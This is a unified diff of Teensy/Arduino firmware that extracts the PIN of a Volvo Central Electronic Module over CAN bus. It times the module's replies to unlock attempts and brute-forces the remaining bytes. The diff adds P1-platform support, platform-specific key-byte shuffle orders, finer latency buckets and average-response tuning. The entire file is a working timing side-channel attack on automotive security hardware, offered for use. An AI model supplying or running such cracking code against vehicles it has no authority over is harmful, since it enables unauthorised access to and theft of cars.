@@ -4,6 +4,17 @@
  *
  * This work is licensed under the terms of the GNU GPL, version 3.
  *
+ *
+ * P1 tested settings;
+ *        Teensy 4.0
+ *        SAMPLES = 5 Seems to work reliably
+ *        CALC_BYTES = 4 does seem to work fine, 3 might be more reliable
+ *        BUCKETS_PER_US 4
+ *        CPU SPEED: 600MHz (default)
+ *        OPTIMIZE: Fastest (default)
+ * 
+ * MCP2515 Library: https://github.com/Seeed-Studio/CAN_BUS_Shield.git
+ *
  */
 
 #include <SPI.h>
@@ -11,17 +22,43 @@
 #include <mcp_can_dfs.h>
 
 /* tunables */
-//#define HAS_CAN_LS       /* CEM is in the car, both LS and HS CAN-buses need to go into programming mode */
-#define SAMPLES      30  /* how many samples to do on a sequence, more is better (up to 100) */
-#define CALC_BYTES    3  /* how many PIN bytes to calculate (1 to 4), the rest is brute-forced */
-#define CEM_REPLY_DELAY_US 80 /* minimum time in us for CEM to reply for PIN unlock command (approx) */
+
+//#define PLATFORM_P1 /* P1 Platform (S40/V50/C30/C70) MC9S12xxXXX based */
+#define PLATFORM_P2 /* P2 Platform (S60/S80/V70/XC70/XC90*/
+
+//#define HAS_CAN_LS        /* CEM is in the car, both LS and HS CAN-buses need to go into programming mode */
+#define SAMPLES        30   /* how many samples to do on a sequence, more is better (up to 100) */
+#define CALC_BYTES     3    /* how many PIN bytes to calculate (1 to 4), the rest is brute-forced */
+#define NUM_LOOPS      1000 /* how many loops to do when calculating crack rate */
+
+
+#if defined(PLATFORM_P2)
+#define BUCKETS_PER_US 1                           /* how many buckets per microsecond do we store (4 means 1/4us or 0.25us resolution */
+#define CEM_REPLY_DELAY_US (80*BUCKETS_PER_US)     /* minimum time in us for CEM to reply for PIN unlock command (approx) */
+int shuffle_order[] = { 3, 1, 5, 0, 2, 4 };
+
+#elif defined(PLATFORM_P1)
+#define BUCKETS_PER_US 4                            /* how many buckets per microsecond do we store (4 means 1/4us or 0.25us resolution */
+#define AVERAGE_DELTA_MIN   (16*BUCKETS_PER_US)     /* Buckets to look at before the average */
+#define AVERAGE_DELTA_MAX   (32*BUCKETS_PER_US)     /* Buckets to look at after the average  */
+#define CEM_REPLY_DELAY_US  (200*BUCKETS_PER_US)    /* minimum time in us for CEM to reply for PIN unlock command (approx) */
+/* P1 processes the key in order
+   The order in flash is still shuffled though
+   Order in flash: 5, 2, 1, 4, 0, 3
+*/
+int shuffle_order[] = { 0, 1, 2, 3, 4, 5 };
+
+#else
+#error Platform required // Must pick PLATFORM_P1 or PLATFORM_P2 above
+#endif
 
 #define CAN_HS_CS_PIN 2  /* MCP2515 chip select pin CAN-HS */
 #define CAN_LS_CS_PIN 3  /* MCP2515 chip select pin CAN-LS */
 #define CAN_INTR_PIN  4  /* MCP2515 interrupt pin CAN-HS */
 #define CAN_L_PIN    10  /* CAN-HS- wire, directly connected (CAN-HS, Low)*/
 #define TSC ARM_DWT_CYCCNT
-#define CEM_REPLY_US 200
+#define MCP2515_CLOCK MCP_8MHz /*Different boards may have a different crystal, Seed Studio is MCP_16MHZ */
+#define CEM_REPLY_US (200 * BUCKETS_PER_US)
 #define printf Serial.printf
 
 #define CAN_HS_BAUD CAN_500KBPS
@@ -33,6 +70,7 @@ MCP_CAN CAN_HS(CAN_HS_CS_PIN);
 MCP_CAN CAN_LS(CAN_LS_CS_PIN);
 
 bool cem_print = true;
+long average_response = 0;
 
 void cem_send_bus(MCP_CAN &bus, unsigned long id, byte *d)
 {
@@ -90,22 +128,26 @@ int crack_rate;
 
 int cem_print_crack_rate()
 {
-  byte pin[PIN_LEN];
+  byte pin[PIN_LEN] = { 0 };
   long start, end;
   int lat;
   bool cp = cem_print;
-  int n = 1000;
   int rate;
-
   cem_print = false;
+  average_response = 0;
 
   start = millis();
-  for (int i = 0; i < n; i++)
+  for (int i = 0; i < NUM_LOOPS; i++) {
+    pin[0] = random(0, 255); // Found better average calculation using random number here
     cem_unlock(pin, &lat, true);
+    average_response += lat / (clockCyclesPerMicrosecond() / BUCKETS_PER_US);
+  }
   end = millis();
-  rate = 1000 * n / (end - start);
-  printf("%d pins in %d ms, %d pins/s\n", n, (end - start), rate);
+  average_response = average_response / NUM_LOOPS;
+  rate = 1000 * NUM_LOOPS / (end - start);
+  printf("%d pins in %d ms, %d pins/s, average response: %d\n", NUM_LOOPS, (end - start), rate, average_response);
   cem_print = cp;
+
   return rate;
 }
 
@@ -127,12 +169,12 @@ bool cem_unlock(byte *pin, int *lat, bool shuffle)
   bool prev_pin = true;
 
   if (shuffle) {
-    p[3] = pin[0];
-    p[1] = pin[1];
-    p[5] = pin[2];
-    p[0] = pin[3];
-    p[2] = pin[4];
-    p[4] = pin[5];
+    p[shuffle_order[0]] = pin[0];
+    p[shuffle_order[1]] = pin[1];
+    p[shuffle_order[2]] = pin[2];
+    p[shuffle_order[3]] = pin[3];
+    p[shuffle_order[4]] = pin[4];
+    p[shuffle_order[5]] = pin[5];
   } else {
     memcpy(p, pin, 6);
   }
@@ -237,13 +279,14 @@ void crack_pin_pos(byte *pin, int pos)
     for (int j = 0; j < SAMPLES; j++) {
       pin[pos + 2] = to_bcd(j);
       cem_unlock(pin, &lat, shuffle);
-      int idx = lat / clockCyclesPerMicrosecond();
+      int idx = lat / (clockCyclesPerMicrosecond() / BUCKETS_PER_US);
       if (idx >= CEM_REPLY_US)
         idx = CEM_REPLY_US - 1;
       h[idx]++;
     }
     pin[pos + 2] = 0;
 
+#if defined(PLATFORM_P2)
     if ((i % 100) == 99) {
       int prod = 0;
       for (int k = 0; k < CEM_REPLY_US; k++) {
@@ -256,12 +299,33 @@ void crack_pin_pos(byte *pin, int pos)
       s[i / 100].b = pin[pos + 0];
       s[i / 100].lat  = prod;
     }
+#elif defined(PLATFORM_P1)
+    if ((i % 100) == 99) {
+      long prod = 0;
+      int sum = 0;
+      for (int k = (average_response - AVERAGE_DELTA_MIN); k < (average_response + AVERAGE_DELTA_MAX); k++) {
+        if ( k > average_response - 8 && k < average_response + 16) {
+          printf("%03d ", h[k]);
+        }
+        prod += h[k] * k;
+        sum += h[k];
+      }
+      prod = prod / sum; // Average
+      printf(": %d\n", prod);
+
+      s[i / 100].b = pin[pos + 0];
+      s[i / 100].lat  = prod;
+    }
+#endif
+
   }
 
   qsort(s, 100, sizeof(struct seq), seq_max);
   for (int i = 0; i < 25; i++) {
     printf("%d: %02x = %d\n", i, s[i].b, s[i].lat);
   }
+
+  average_response = s[0].lat;
 
   printf("pin[%d] candidate: %02x lat %d\n", pos, s[0].b, s[0].lat);
   pin[pos] = s[0].b;
@@ -314,7 +378,7 @@ void setup() {
   printf("CEM_REPLY_DELAY_US %d\n", CEM_REPLY_DELAY_US);
   printf("clockCyclesPerMicrosecond %d\n", clockCyclesPerMicrosecond());
   printf("CAN_HS init\n");
-  while (MCP2515_OK != CAN_HS.begin(CAN_HS_BAUD, MCP_8MHz)) {
+  while (MCP2515_OK != CAN_HS.begin(CAN_HS_BAUD, MCP2515_CLOCK)) {
     delay(1000);
   }
   attachInterrupt(digitalPinToInterrupt(CAN_INTR_PIN), cem_intr, FALLING);
